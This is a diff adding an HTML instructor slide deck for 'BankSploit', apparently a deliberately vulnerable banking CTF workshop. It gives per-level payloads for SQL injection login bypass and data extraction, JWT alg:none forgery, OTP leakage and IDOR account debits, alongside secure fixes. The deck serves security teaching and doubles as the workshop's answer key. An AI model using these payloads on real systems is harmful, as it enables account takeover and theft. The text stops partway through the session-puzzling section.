@@ -1,0 +1,627 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BankSploit — Vulnerability Explanation & Solutions</title>
+<style>
+:root{--bg:#0b1020;--card:#131a30;--fg:#e9ecf5;--muted:#9aa5c4;--bd:#243156;--acc:#7aa2f7;
+ --code:#0a0f1f;--inj:#ffd166;--l0:#f07272;--l1:#f0b867;--l2:#7ec8f0;--l3:#5fd29a;--ok:#5fd29a;}
+*{box-sizing:border-box}
+html,body{margin:0;height:100%;background:var(--bg);color:var(--fg);
+ font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;}
+.deck{height:100vh;overflow:hidden}
+.slide{display:none;height:100vh;padding:4.5vh 6vw 8vh;overflow-y:auto;animation:fade .25s ease}
+.slide.on{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+h1{font-size:3.1rem;line-height:1.08;margin:.2em 0}
+h2{font-size:1.9rem;margin:.1em 0}
+p{font-size:1.18rem;line-height:1.55;margin:.35em 0 .9em;color:#dfe4f2}
+code{background:#1b2444;border:1px solid var(--bd);padding:.06em .4em;border-radius:5px;
+ font-family:ui-monospace,Consolas,monospace;font-size:.9em;color:#cdd8ff}
+.lab{text-transform:uppercase;letter-spacing:.08em;font-size:.74rem;font-weight:800;
+ color:var(--acc);margin-top:.9rem;margin-bottom:.1rem}
+/* title */
+.title{display:flex;align-items:center}
+.title-wrap{max-width:60rem}.kicker{color:var(--acc);font-weight:800;letter-spacing:.14em;
+ text-transform:uppercase;font-size:.9rem}
+.sub{color:var(--muted);font-size:1.25rem;margin-top:1.2rem}
+.legend{margin-top:2rem;display:flex;gap:.6rem;flex-wrap:wrap}
+.pill{padding:.25em .8em;border-radius:999px;font-size:.82rem;font-weight:700;border:1px solid}
+.pill.l0{color:var(--l0);border-color:#f0727255;background:#f0727218}
+.pill.l1{color:var(--l1);border-color:#f0b86755;background:#f0b86718}
+.pill.l2{color:var(--l2);border-color:#7ec8f055;background:#7ec8f018}
+.pill.l3{color:var(--l3);border-color:#5fd29a55;background:#5fd29a18}
+/* agenda */
+.agenda-h{margin-bottom:1rem}
+.agenda{list-style:none;padding:0;margin:0;counter-reset:a}
+.agenda li{counter-increment:a;display:flex;align-items:center;gap:1rem;padding:.7rem .4rem;
+ border-bottom:1px solid var(--bd);font-size:1.15rem}
+.agenda li::before{content:counter(a);width:1.9rem;height:1.9rem;flex:0 0 auto;border-radius:8px;
+ background:#1b2444;color:var(--acc);font-weight:800;display:grid;place-items:center;font-size:.95rem}
+.agenda .tag{font-family:ui-monospace,monospace;font-weight:800;color:#fff;
+ background:#273257;border:1px solid var(--bd);padding:.1em .55em;border-radius:6px;min-width:3rem;text-align:center}
+.agenda .mod{color:var(--muted);min-width:6rem;font-size:.95rem}
+.agenda .aname{font-weight:600;flex:1}
+.agenda .acwe{color:var(--muted);font-size:.9rem}
+/* overview */
+.ovh{display:flex;gap:1.3rem;align-items:center;margin-bottom:1.4rem}
+.ovtag{font-family:ui-monospace,monospace;font-weight:800;font-size:1.7rem;color:#0b1020;
+ background:var(--acc);padding:.3em .55em;border-radius:12px;min-width:3.6rem;text-align:center}
+.ovcwe{color:var(--muted);font-size:.9rem;font-weight:600}
+.ovtitle{margin:.05em 0}
+.ovwhere{color:var(--l2);font-size:1rem;margin-top:.2rem}
+.ovbody{display:grid;grid-template-columns:1.25fr 1fr;gap:2.2rem}
+.goal{font-size:1.26rem;color:#fff}
+.ladder{display:flex;flex-direction:column;gap:.4rem;margin-top:.3rem}
+.lrow{display:flex;gap:.8rem;align-items:baseline;background:#101832;border:1px solid var(--bd);
+ border-radius:8px;padding:.45rem .7rem}
+.lk{font-family:ui-monospace,monospace;font-weight:800;min-width:3.3rem}
+.lrow:nth-child(1) .lk{color:var(--l0)}.lrow:nth-child(2) .lk{color:var(--l1)}
+.lrow:nth-child(3) .lk{color:var(--l2)}.lrow:nth-child(4) .lk{color:var(--l3)}
+.lv{color:#cdd6ee;font-size:1rem}
+.fixbox{margin-top:1.1rem;background:#0f2a1f;border:1px solid #2f7a55;border-radius:10px;
+ padding:.9rem 1rem;font-size:1.02rem;color:#d6f3e4}
+.fixbox code{background:#13341f;border-color:#2f7a55;color:#b9f2d4}
+.note{margin-top:1rem;background:#2a2410;border:1px solid #8a6d2a;border-radius:10px;
+ padding:.8rem 1rem;font-size:1rem;color:#f2e4bf}
+.note code{background:#3a2f12;border-color:#8a6d2a;color:#ffe9a8}
+/* level slide */
+.slh{display:flex;align-items:center;gap:.9rem;flex-wrap:wrap;border-bottom:1px solid var(--bd);
+ padding-bottom:.9rem;margin-bottom:1.1rem}
+.slh-tag{font-family:ui-monospace,monospace;font-weight:800;font-size:1.3rem;color:#0b1020;
+ background:var(--acc);padding:.18em .5em;border-radius:9px}
+.slh-lvl{font-weight:800;font-size:1.45rem}
+.slh-lvl.l0{color:var(--l0)}.slh-lvl.l1{color:var(--l1)}.slh-lvl.l2{color:var(--l2)}
+.slh-ttl{color:var(--muted);margin-left:auto;font-size:1rem}
+.slbody{max-width:60rem}
+.code{background:var(--code);border:1px solid var(--bd);border-left:3px solid var(--acc);
+ border-radius:10px;padding:1rem 1.1rem;margin:.8rem 0;font-family:ui-monospace,Consolas,monospace;
+ font-size:1.02rem;line-height:1.6;white-space:pre-wrap;color:#cdd8ff;overflow-x:auto}
+.code .inj{color:var(--inj);background:#3a2f0c;border-radius:4px;padding:.02em .15em;font-weight:700}
+.code .cmt{color:#7f8bb0;font-style:italic}
+.paywrap{margin-top:1rem}
+.payload{background:#101b3a;border:1px dashed var(--acc);border-radius:9px;padding:.7rem .9rem;
+ font-family:ui-monospace,Consolas,monospace;font-size:1.12rem;color:var(--inj);font-weight:700;
+ word-break:break-all;user-select:all}
+.paynote{color:var(--muted);font-size:.95rem;margin-top:.35rem}
+.lesson{margin-top:1rem;background:#102033;border:1px solid var(--acc);border-radius:10px;
+ padding:.8rem 1rem;font-size:1.05rem;color:#dbe6ff}
+/* chrome */
+.bar{position:fixed;left:0;right:0;bottom:0;height:3.2rem;background:#0a0f1fcc;backdrop-filter:blur(6px);
+ border-top:1px solid var(--bd);display:flex;align-items:center;gap:1rem;padding:0 1.2rem;z-index:30;font-size:.9rem}
+.bar .nav{display:flex;gap:.4rem}
+.bar button{background:#18223f;color:var(--fg);border:1px solid var(--bd);border-radius:7px;
+ padding:.35rem .7rem;cursor:pointer;font-weight:700}
+.bar button:hover{border-color:var(--acc)}
+.bar .where{color:var(--muted)}.bar .count{margin-left:auto;color:var(--muted);font-variant-numeric:tabular-nums}
+.bar .prog{height:3px;background:var(--acc);position:absolute;top:-1px;left:0;transition:width .2s}
+#menu{position:fixed;inset:0;background:#070b16ee;z-index:40;display:none;padding:6vh 8vw;overflow-y:auto}
+#menu.on{display:block}
+#menu h3{color:var(--acc);letter-spacing:.1em;text-transform:uppercase;font-size:.9rem}
+#menu .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(16rem,1fr));gap:.7rem;margin-top:1rem}
+#menu button{text-align:left;background:#121a33;border:1px solid var(--bd);border-radius:10px;
+ padding:.8rem 1rem;color:var(--fg);cursor:pointer;font-size:1rem}
+#menu button:hover{border-color:var(--acc);background:#172241}
+#menu button b{color:var(--acc);font-family:ui-monospace,monospace;margin-right:.5rem}
+@media print{
+ .slide{display:block!important;height:auto;min-height:92vh;page-break-after:always;padding:3vh 4vw}
+ .bar,#menu{display:none!important}
+ html,body,.deck{height:auto;overflow:visible}
+}
+@media(max-width:760px){.ovbody{grid-template-columns:1fr}h1{font-size:2.2rem}}
+</style></head><body>
+<div class="deck" id="deck">
+<section class="slide title">
+  <div class="title-wrap">
+    <div class="kicker">BankSploit · Instructor Reference</div>
+    <h1>Vulnerabilities &mdash;<br>Explanation &amp; Solutions</h1>
+    <p class="sub">All 8 workshop vulnerabilities, every vulnerable level, with the exact payload.<br>
+       SQL&nbsp;injection slides show the live query. Use <b>&larr; &rarr;</b> to move, <b>M</b> for the menu.</p>
+    <div class="legend"><span class="pill l0">L0 fully vulnerable</span><span class="pill l1">L1 weak</span><span class="pill l2">L2 partial</span><span class="pill l3">L3 secure</span></div>
+  </div></section>
+<section class="slide agenda"><h2 class="agenda-h">The 8 vulnerabilities</h2><ol class="agenda"><li><span class="tag">G1</span> <span class="mod">auth</span><span class="aname">SQL Injection — Login Bypass</span><span class="acwe">CWE-89 · A03:2021</span></li><li><span class="tag">L11</span> <span class="mod">auth</span><span class="aname">OTP in Response Body</span><span class="acwe">CWE-200 · A04:2021</span></li><li><span class="tag">L12</span> <span class="mod">auth</span><span class="aname">JWT Forgery → Admin</span><span class="acwe">CWE-347 · A02:2021</span></li><li><span class="tag">L1</span> <span class="mod">transfer</span><span class="aname">IDOR — Transfer From Another Account</span><span class="acwe">CWE-639 · A01:2021</span></li><li><span class="tag">G2</span> <span class="mod">statements</span><span class="aname">SQL Injection — Data Extraction</span><span class="acwe">CWE-89 · A03:2021</span></li><li><span class="tag">L25</span> <span class="mod">auth</span><span class="aname">Session Puzzling (Forgot-Password)</span><span class="acwe">CWE-841 · A07:2021</span></li><li><span class="tag">G4</span> <span class="mod">statements</span><span class="aname">Reflected XSS</span><span class="acwe">CWE-79 · A03:2021  ·  🎓 training only (no flag)</span></li><li><span class="tag">G9</span> <span class="mod">statements</span><span class="aname">Command Injection</span><span class="acwe">CWE-78 · A03:2021</span></li></ol></section>
+<section class="slide overview">
+      <div class="ovh">
+        <div class="ovtag">G1</div>
+        <div>
+          <div class="ovcwe">CWE-89 · A03:2021</div>
+          <h2 class="ovtitle">SQL Injection — Login Bypass</h2>
+          <div class="ovwhere">📍 /login — Customer ID box</div>
+        </div>
+      </div>
+      <div class="ovbody">
+        <div class="ovcol">
+          <div class="lab">Goal</div><p class="goal">Sign in as <b>your own</b> account without knowing the password.</p>
+          <div class="lab">Root cause</div><p>Your Customer ID is <b>concatenated straight into the login SQL</b>. A single quote ends the string literal, and everything you type after it is parsed as SQL — so you can rewrite the query's logic and drop the password check.</p>
+          
+        </div>
+        <div class="ovcol">
+          <div class="lab">Level ladder</div><div class="ladder"><div class="lrow"><span class="lk">L0</span><span class="lv">raw query, DB error shown</span></div><div class="lrow"><span class="lk">L1</span><span class="lv">+ blacklist on comments/UNION</span></div><div class="lrow"><span class="lk">L2</span><span class="lv">blind + bracketed + comment filter</span></div><div class="lrow"><span class="lk">L3</span><span class="lv">parameterized + bcrypt</span></div></div>
+          <div class="fixbox"><b>L3 — secure:</b> a parameterized query (<code>customer_id = ?</code>) + <code>password_verify()</code> (bcrypt), one generic “Invalid credentials” message, and a 5-attempt lockout. Input is data, never SQL.</div>
+        </div>
+      </div></section>
+<section class="slide level l0">
+          <div class="slh">
+            <span class="slh-tag">G1</span>
+            <span class="slh-lvl l0">L0 &mdash; Fully vulnerable (error-based)</span>
+            <span class="slh-ttl">SQL Injection — Login Bypass</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>Nothing filtered. The raw database error is returned to the screen, so a lone quote confirms injection instantly.</p>
+            <div class="lab">How to solve it</div><p>Comment the password check out of the query. <code>--</code> needs a trailing space.</p>
+            <pre class="code">SELECT id, customer_id, name, role FROM users
+WHERE customer_id = '<span class="inj">BS100234' -- </span>'
+  AND password_md5 = '…'  <span class="cmt">← commented out, never runs</span></pre>
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">BS100234' -- </div><div class="paynote">your own Customer ID + any password</div></div>
+            
+          </div></section>
+<section class="slide level l1">
+          <div class="slh">
+            <span class="slh-tag">G1</span>
+            <span class="slh-lvl l1">L1 &mdash; Naive blacklist</span>
+            <span class="slh-ttl">SQL Injection — Login Bypass</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>Blocks <code>--</code>, <code>#</code>, <code>/*</code> and <code>union</code> (rejects “Illegal characters”). The comment trick now fails — but <code>OR</code> is <b>not</b> blocked.</p>
+            <div class="lab">How to solve it</div><p>You can't comment, so make the row match another way. <code>AND</code> binds tighter than <code>OR</code>, so an un-bracketed <code>OR</code> on your Customer ID is enough.</p>
+            <pre class="code">WHERE customer_id = '<span class="inj">BS100234' OR '1'='1</span>'
+  AND password_md5 = '…'
+<span class="cmt">reads as:  customer_id='BS100234'  OR  ('1'='1' AND password=…)
+            └─ true on its own → row returned</span></pre>
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">BS100234' OR '1'='1</div><div class="paynote">no comment needed</div></div>
+            
+          </div></section>
+<section class="slide level l2">
+          <div class="slh">
+            <span class="slh-tag">G1</span>
+            <span class="slh-lvl l2">L2 &mdash; Blind + brackets + comment filter</span>
+            <span class="slh-ttl">SQL Injection — Login Bypass</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>DB error <b>hidden</b> (blind). The Customer ID test is wrapped in <code>( )</code> with the password check <b>outside</b> the brackets. Comment tokens are also blacklisted — rejected with a <b>generic “Invalid credentials”</b> (same as a wrong password, so you can't even tell the filter tripped).</p>
+            <div class="lab">How to solve it</div><p>A bare <code>OR</code> is now trapped inside the brackets, and you can't comment the tail away. <b>Supply the closing <code>)</code> yourself</b> to escape the parens, then <code>OR</code> at the top level — the query's own trailing <code>')</code> balances your quote. No comment.</p>
+            <pre class="code">WHERE (customer_id = '<span class="inj">BS100234') OR ('1'='1</span>')
+  AND password_md5 = '…'
+<span class="cmt">reads as:  (customer_id='BS100234')  OR  ('1'='1' AND password=…)
+            password branch is false → whole clause = customer_id='BS100234'</span></pre>
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">BS100234') OR ('1'='1</div><div class="paynote">close the bracket, OR outside it</div></div>
+            <div class="lesson">💡 Comment-blacklisting is <b>not</b> a SQLi defence — you break the bracket without one.</div>
+          </div></section>
+<section class="slide overview">
+      <div class="ovh">
+        <div class="ovtag">L11</div>
+        <div>
+          <div class="ovcwe">CWE-200 · A04:2021</div>
+          <h2 class="ovtitle">OTP in Response Body</h2>
+          <div class="ovwhere">📍 /login → OTP screen; the script /public/js/otp-validation.js</div>
+        </div>
+      </div>
+      <div class="ovbody">
+        <div class="ovcol">
+          <div class="lab">Goal</div><p class="goal">Recover the 2FA OTP from the <b>client</b>, not the victim's phone.</p>
+          <div class="lab">Root cause</div><p>The login OTP is injected server-side into a dynamically-built JavaScript file (<code>otp-validation.js</code>, the <code>SESSION_DATA</code> object). Anything the browser receives, the user can read — so a secret that rides down to the client is already lost.</p>
+          
+        </div>
+        <div class="ovcol">
+          <div class="lab">Level ladder</div><div class="ladder"><div class="lrow"><span class="lk">L0</span><span class="lv">plaintext OTP + flag in JS</span></div><div class="lrow"><span class="lk">L1</span><span class="lv">OTP derivable from leaked seed+uid</span></div><div class="lrow"><span class="lk">L2</span><span class="lv">hash+sealed flag in headers</span></div><div class="lrow"><span class="lk">L3</span><span class="lv">OTP never leaves the server</span></div></div>
+          <div class="fixbox"><b>L3 — secure:</b> nothing OTP-related is injected into the script. The code the OTP is <b>verified entirely server-side</b> — there is nothing on the client to read, recompute or brute-force.</div>
+        </div>
+      </div></section>
+<section class="slide level l0">
+          <div class="slh">
+            <span class="slh-tag">L11</span>
+            <span class="slh-lvl l0">L0 &mdash; Plaintext in the JS body</span>
+            <span class="slh-ttl">OTP in Response Body</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>The OTP sits in plaintext in <code>_otp</code> and the flag in <code>_flag</code>, right in the served script.</p>
+            <div class="lab">How to solve it</div><p>Open DevTools → Sources/Network → <code>otp-validation.js</code> and read them. Or in the console:</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">fetch('/public/js/otp-validation.js') → read _otp and _flag</div><div class="paynote">everything is exposed</div></div>
+            
+          </div></section>
+<section class="slide level l1">
+          <div class="slh">
+            <span class="slh-tag">L11</span>
+            <span class="slh-lvl l1">L1 &mdash; Predictable from seed + uid</span>
+            <span class="slh-ttl">OTP in Response Body</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>No plaintext OTP. The token id leaks as <code>_seed</code>, the user id as <code>_uid</code>; the flag is sealed in <code>_flag_enc</code>.</p>
+            <div class="lab">How to solve it</div><p>Recompute the OTP, then unseal the flag. Inputs are concatenated as <b>strings</b>, not added.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">otp = parseInt( sha256(_seed + _uid)[:8], 16) % 10000</div><div class="paynote">then flag = _flag_enc XOR sha256(otp)</div></div>
+            
+          </div></section>
+<section class="slide level l2">
+          <div class="slh">
+            <span class="slh-tag">L11</span>
+            <span class="slh-lvl l2">L2 &mdash; Secrets in response headers</span>
+            <span class="slh-ttl">OTP in Response Body</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>The body carries only breadcrumbs. The OTP hash <code>X-Otp-Check = sha256(otp)</code> and the sealed <code>X-Flag-Enc</code> ride in the <b>response headers</b> of the script.</p>
+            <div class="lab">How to solve it</div><p>Read the response headers (Network tab), then brute-force the 10,000-value OTP space against the hash — trivial — and decrypt the sealed flag.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">for otp in 0000..9999: if sha256(otp)==X-Otp-Check → decrypt X-Flag-Enc</div><div class="paynote">4-digit space = instant</div></div>
+            
+          </div></section>
+<section class="slide overview">
+      <div class="ovh">
+        <div class="ovtag">L12</div>
+        <div>
+          <div class="ovcwe">CWE-347 · A02:2021</div>
+          <h2 class="ovtitle">JWT Forgery → Admin</h2>
+          <div class="ovwhere">📍 access_token cookie / Bearer; proof at /admin/vault</div>
+        </div>
+      </div>
+      <div class="ovbody">
+        <div class="ovcol">
+          <div class="lab">Goal</div><p class="goal">Forge a token claiming <b>role: admin</b> without the signing key.</p>
+          <div class="lab">Root cause</div><p>The app trusts a <b>browser-readable JWT</b> for identity and role. A JWT is only as good as the server's verification of its signature — if the server doesn't properly verify, the client can rewrite the claims.</p>
+          <div class="note"><b>Note.</b> Flag caveat: forge <code>sub</code> = <b>your own</b> id (+ role:admin) so the flag at /admin/vault is keyed to the account you'll submit from.</div>
+        </div>
+        <div class="ovcol">
+          <div class="lab">Level ladder</div><div class="ladder"><div class="lrow"><span class="lk">L0</span><span class="lv">signature present but never verified</span></div><div class="lrow"><span class="lk">L1</span><span class="lv">alg:none accepted</span></div><div class="lrow"><span class="lk">L2</span><span class="lv">only lowercase 'none' blocked</span></div><div class="lrow"><span class="lk">L3</span><span class="lv">HS256 pinned + verified</span></div></div>
+          <div class="fixbox"><b>L3 — secure:</b> algorithm <b>pinned to HS256</b>, HMAC verified with the server secret (constant-time), and <code>exp</code> checked. <code>none</code>/<code>None</code> and any tampered token are rejected.</div>
+        </div>
+      </div></section>
+<section class="slide level l0">
+          <div class="slh">
+            <span class="slh-tag">L12</span>
+            <span class="slh-lvl l0">L0 &mdash; Signature not verified</span>
+            <span class="slh-ttl">JWT Forgery → Admin</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>The verifier only checks that a signature <i>segment exists</i> — it never checks the HMAC.</p>
+            <div class="lab">How to solve it</div><p>Edit the payload, leave any signature string in place.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">{"sub":"&lt;your id&gt;","role":"admin", …}</div><div class="paynote">signature ignored entirely</div></div>
+            
+          </div></section>
+<section class="slide level l1">
+          <div class="slh">
+            <span class="slh-tag">L12</span>
+            <span class="slh-lvl l1">L1 &mdash; alg:none accepted</span>
+            <span class="slh-ttl">JWT Forgery → Admin</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>Replaying the old signature now fails (the HMAC <i>is</i> checked) — but the verifier still accepts <b>unsigned</b> tokens when the header says <code>alg:none</code>.</p>
+            <div class="lab">How to solve it</div><p>Drop the signature and declare no algorithm.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">header {"alg":"none"} + admin payload + empty signature</div><div class="paynote">no key required</div></div>
+            
+          </div></section>
+<section class="slide level l2">
+          <div class="slh">
+            <span class="slh-tag">L12</span>
+            <span class="slh-lvl l2">L2 &mdash; Case-sensitive alg check</span>
+            <span class="slh-ttl">JWT Forgery → Admin</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>Plain lowercase <code>none</code> is now rejected — but the check is case-sensitive, so a differently-cased value slips past into the same unsigned-accept path.</p>
+            <div class="lab">How to solve it</div><p>Use a capitalised variant.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">header {"alg":"None"}  (or "NONE") + empty signature</div><div class="paynote">string compare missed the variants</div></div>
+            
+          </div></section>
+<section class="slide overview">
+      <div class="ovh">
+        <div class="ovtag">L1</div>
+        <div>
+          <div class="ovcwe">CWE-639 · A01:2021</div>
+          <h2 class="ovtitle">IDOR — Transfer From Another Account</h2>
+          <div class="ovwhere">📍 /transfer wizard (“From” account)</div>
+        </div>
+      </div>
+      <div class="ovbody">
+        <div class="ovcol">
+          <div class="lab">Goal</div><p class="goal">Debit an account that <b>isn't yours</b>.</p>
+          <div class="lab">Root cause</div><p>The “From” account is chosen by a value the <b>client sends</b> (<code>from_account_ref</code>), and the server debits it <b>without checking you own it</b>. Each level just wraps that reference in a fancier envelope — none of them add the missing ownership check.</p>
+          
+        </div>
+        <div class="ovcol">
+          <div class="lab">Level ladder</div><div class="ladder"><div class="lrow"><span class="lk">L0</span><span class="lv">raw account number, no check</span></div><div class="lrow"><span class="lk">L1</span><span class="lv">number + HMAC signature</span></div><div class="lrow"><span class="lk">L2</span><span class="lv">client-side AES ciphertext</span></div><div class="lrow"><span class="lk">L3</span><span class="lv">server scopes to WHERE user_id = you</span></div></div>
+          <div class="fixbox"><b>L3 — secure:</b> the execute path scopes the source account — <code>WHERE id = :id AND user_id = :current_user</code>. Every forged number, signature or ciphertext simply matches no row.</div>
+        </div>
+      </div></section>
+<section class="slide level l0">
+          <div class="slh">
+            <span class="slh-tag">L1</span>
+            <span class="slh-lvl l0">L0 &mdash; Raw account number</span>
+            <span class="slh-ttl">IDOR — Transfer From Another Account</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p><code>from_account_ref</code> is simply the plain account number; the server debits whatever you send.</p>
+            <div class="lab">How to solve it</div><p>In DevTools, edit the <code>&lt;select name="from_account_ref"&gt;</code> option to a victim's number and finish the wizard.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">from_account_ref = 50100100000002</div><div class="paynote">their account is drained</div></div>
+            
+          </div></section>
+<section class="slide level l1">
+          <div class="slh">
+            <span class="slh-tag">L1</span>
+            <span class="slh-lvl l1">L1 &mdash; Number + HMAC signature</span>
+            <span class="slh-ttl">IDOR — Transfer From Another Account</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>The form now submits the number <b>and</b> a signature — <code>from_account_sig = hmac(number)</code>. Editing only the number leaves the signature wrong, so it's rejected.</p>
+            <div class="lab">How to solve it</div><p>You don't need to forge the HMAC — you just need a valid <b>pair</b>. The page leaks a signed number+sig pair in the Network request; reuse a leaked victim pair.</p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">from_account_ref=&lt;number&gt; &amp; from_account_sig=&lt;64-hex&gt;</div><div class="paynote">replay a leaked valid pair</div></div>
+            
+          </div></section>
+<section class="slide level l2">
+          <div class="slh">
+            <span class="slh-tag">L1</span>
+            <span class="slh-lvl l2">L2 &mdash; Client-side encryption</span>
+            <span class="slh-ttl">IDOR — Transfer From Another Account</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>A page script encrypts your selection with <code>XferRef.encryptRef()</code> (AES) into <code>from_account_ref</code>. Editing the dropdown to a victim's number isn't on the page's own-account allowlist, so the ref posts empty.</p>
+            <div class="lab">How to solve it</div><p>The encryption runs in the browser, so the <b>key is in the JS</b> (<code>/public/vendor/transfer-ref.js</code>). Mint ciphertext for any number from the console. <i>(The exposed key is intentional — that's the lesson: client-side crypto protects nothing.)</i></p>
+            
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">XferRef.encryptRef('50100100000002')</div><div class="paynote">paste the result into from_account_ref</div></div>
+            
+          </div></section>
+<section class="slide overview">
+      <div class="ovh">
+        <div class="ovtag">G2</div>
+        <div>
+          <div class="ovcwe">CWE-89 · A03:2021</div>
+          <h2 class="ovtitle">SQL Injection — Data Extraction</h2>
+          <div class="ovwhere">📍 /statements — Remarks search box</div>
+        </div>
+      </div>
+      <div class="ovbody">
+        <div class="ovcol">
+          <div class="lab">Goal</div><p class="goal">Read <b>another user's flag</b> out of the <code>ctf_flags</code> table.</p>
+          <div class="lab">Root cause</div><p>Only the search term is injectable — the date range is always bound. The term is spliced into a <code>LIKE</code> clause, so a crafted term stops being “text to match” and becomes SQL. Each level filters the term differently but still concatenates it.</p>
+          <div class="note"><b>Note.</b> The flag is a per-user HMAC in <code>ctf_flags</code> (can't be shared) — extract <b>your own</b> row, read it from the results, submit it.</div>
+        </div>
+        <div class="ovcol">
+          <div class="lab">Level ladder</div><div class="ladder"><div class="lrow"><span class="lk">L0</span><span class="lv">raw → UNION / error-based</span></div><div class="lrow"><span class="lk">L1</span><span class="lv">leaky single-pass filter → nest keywords</span></div><div class="lrow"><span class="lk">L2</span><span class="lv">UNION looped-out + blind → one char at a time</span></div><div class="lrow"><span class="lk">L3</span><span class="lv">bound parameter</span></div></div>
+          <div class="fixbox"><b>L3 — secure:</b> the term is a <b>bound parameter</b> — <code>remarks LIKE :q</code>. It's matched as text, never parsed as SQL, at every level of cleverness.</div>
+        </div>
+      </div></section>
+<section class="slide level l0">
+          <div class="slh">
+            <span class="slh-tag">G2</span>
+            <span class="slh-lvl l0">L0 &mdash; Raw — in-band UNION / error-based</span>
+            <span class="slh-ttl">SQL Injection — Data Extraction</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>The term is used exactly as typed, and raw SQL errors are shown. The result grid has 7 columns.</p>
+            <div class="lab">How to solve it</div><p>Close the string, then <code>UNION</code> a select from <code>ctf_flags</code> (flag lands in the Remarks cell) — or leak it through an error.</p>
+            <pre class="code">... WHERE (from_account_id=:a1 OR to_account_id=:a2)
+    AND remarks LIKE '%<span class="inj">%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags-- </span>%'
+<span class="cmt">your UNION row joins the result set → another user's flag in the grid</span></pre>
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags-- </div><div class="paynote">flag shows in the Remarks column</div></div>
+            
+          </div></section>
+<section class="slide level l1">
+          <div class="slh">
+            <span class="slh-tag">G2</span>
+            <span class="slh-lvl l1">L1 &mdash; Leaky single-pass blacklist</span>
+            <span class="slh-ttl">SQL Injection — Data Extraction</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p>Strips <code>union select -- # /* */</code> — but only <b>once</b>, case-insensitively. Split or nested keywords survive the single pass; quotes pass through; errors still shown.</p>
+            <div class="lab">How to solve it</div><p>Hide the keyword inside itself so one removal rebuilds it.</p>
+            <pre class="code">remarks LIKE '%<span class="inj">%' UNIunionON SELselectECT username,flag,3,4,5,6,7 FROM ctf_flags-- </span>%'
+<span class="cmt">after one strip pass → ... UNION SELECT ... FROM ctf_flags-- </span></pre>
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">UNIunionON  →  UNION     uni/**/on  →  union</div><div class="paynote">then the same UNION / error-based dump</div></div>
+            
+          </div></section>
+<section class="slide level l2">
+          <div class="slh">
+            <span class="slh-tag">G2</span>
+            <span class="slh-lvl l2">L2 &mdash; UNION looped-out + blind</span>
+            <span class="slh-ttl">SQL Injection — Data Extraction</span>
+          </div>
+          <div class="slbody">
+            <div class="lab">The mitigation at this level</div><p><code>union</code> is stripped <b>repeatedly</b> until stable (nesting can't rebuild it), and errors are hidden. In-band extraction is dead — but boolean logic still reaches the query.</p>
+            <div class="lab">How to solve it</div><p>Ask one yes/no question per character and watch whether any row comes back (boolean-blind). Automate across positions.</p>
+            <pre class="code">remarks LIKE '%<span class="inj">%' AND SUBSTRING((SELECT flag FROM ctf_flags
+   WHERE username='&lt;you&gt;'),1,1)='B'-- </span>%'
+<span class="cmt">rows returned → 1st char is 'B'  ·  no rows → wrong guess  → reconstruct char by char</span></pre>
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">%' AND SUBSTRING((SELECT flag FROM ctf_flags WHERE username='&lt;you&gt;'),1,1)='B'-- </div><div class="paynote">row present = guess correct</div></div>
+            
+          </div></section>
+<section class="slide overview">
+      <div class="ovh">
+        <div class="ovtag">L25</div>
+        <div>
+          <div class="ovcwe">CWE-841 · A07:2021</div>
+          <h2 class="ovtitle">Session Puzzling (Forgot-Password)</h2>
+          <div class="ovwhere">📍 /forgot-password · /forgot-password/reset</div>
+        </div>
+      </div>
+      <div class="ovbody">
+        <div class="ovcol">
+          <div class="lab">Goal</div><p class="goal">Take over another account through the password-recovery flow.</p>
+          <div class="lab">Root cause</div><p>The recovery flow writes session state that the authenticated area trusts, without binding <b>progress</b> to the <b>target account</b>. Mixing recovery state and login state in the same session lets one be used to stand in for the other.</p>
+          
+        </div>
+        <div class="ovcol">
+          <div class="lab">Level ladder</div><div class="ladder"><div class="lrow"><span class="lk">L0</span><span class="lv">step 1 writes the trusted session user</span></div><div class="lrow"><span class="lk">L1 / L2</span><span class="lv">progress not bound to the target — swap it in</span></div><div class="lrow"><span class="lk">L3</span><span class="lv">stage bound to the account that earned it</span></div></div>
